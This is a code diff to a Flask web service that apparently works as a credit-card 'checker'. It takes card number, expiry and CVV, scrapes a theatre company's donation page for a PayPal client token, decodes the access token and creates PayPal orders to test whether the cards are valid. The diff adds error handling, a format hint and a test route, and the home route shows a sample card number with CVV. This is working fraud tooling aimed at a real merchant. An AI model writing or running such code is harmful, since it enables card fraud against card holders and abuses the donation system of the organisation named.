@@ -35,6 +35,13 @@ def check_card(card_data):
             response = session.get('https://atlanticcitytheatrecompany.com/donations/donate/', 
                                   headers=headers)
 
+            # VARIABLES KO PEHLE HI INITIALIZE KARDO
+            prefix = ""
+            id = ""
+            hash = ""
+            enc = ""
+            acc = ""
+
             prefix_match = re.search(r'give-form-id-prefix" value="([^"]+)"', response.text)
             if prefix_match:
                 prefix = prefix_match.group(1)
@@ -50,15 +57,26 @@ def check_card(card_data):
             enc_token_match = re.search(r"data-client-token\":\"(.*?)\"", response.text)
             if enc_token_match:
                 enc = enc_token_match.group(1)
-                print(enc)
+                print(f"Encoded token: {enc}")
+                
+                try:
+                    dec = base64.b64decode(enc).decode('utf-8')
+                    print(f"Decoded: {dec}")
+                    
+                    acc_match = re.search(r"accessToken\":\"(.*?)\"", dec)
+                    if acc_match:
+                        acc = acc_match.group(1)
+                        print(f"Access token: {acc}")
+                    else:
+                        return jsonify({'error': 'Access token not found in decoded data'}), 500
+                except Exception as decode_error:
+                    return jsonify({'error': f'Failed to decode token: {str(decode_error)}'}), 500
+            else:
+                return jsonify({'error': 'Client token not found on page'}), 500
 
-            dec = base64.b64decode(enc).decode('utf-8')
-            print(dec)
-
-            acc_match = re.search(r"accessToken\":\"(.*?)\"", dec)
-            if acc_match:
-                acc = acc_match.group(1)
-                print(acc)
+            # AB ACCESS TOKEN CHECK KARO
+            if not acc:
+                return jsonify({'error': 'No valid access token obtained'}), 500
 
             headers = {
                 'authority': 'atlanticcitytheatrecompany.com',
@@ -118,6 +136,13 @@ def check_card(card_data):
                 files=files
             )
 
+            # Check if order creation was successful
+            try:
+                order_data = response.json()
+                print(f"Order creation response: {order_data}")
+            except:
+                return jsonify({'error': 'Failed to create PayPal order', 'response': response.text}), 500
+
             headers = {
                 'authority': 'cors.api.paypal.com',
                 'accept': '*/*',
@@ -166,14 +191,18 @@ def check_card(card_data):
             return jsonify(response.json())
             
         else:
-            return jsonify({'error': 'Invalid card format'}), 400
+            return jsonify({'error': 'Invalid card format. Use: /cc=number|mm|yy|cvv'}), 400
             
     except Exception as e:
         return jsonify({'error': str(e)}), 500
 
 @app.route('/')
 def home():
-    return jsonify({'status': 'active', 'endpoint': '/cc=4106210008105223|01|2031|143'})
+    return jsonify({'status': 'active', 'endpoint': '/cc=4106210008105223|01|31|143'})
+
+@app.route('/test')
+def test():
+    return jsonify({'test': 'working', 'format': 'cc=number|mm|yy|cvv'})
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=8000, debug=True)
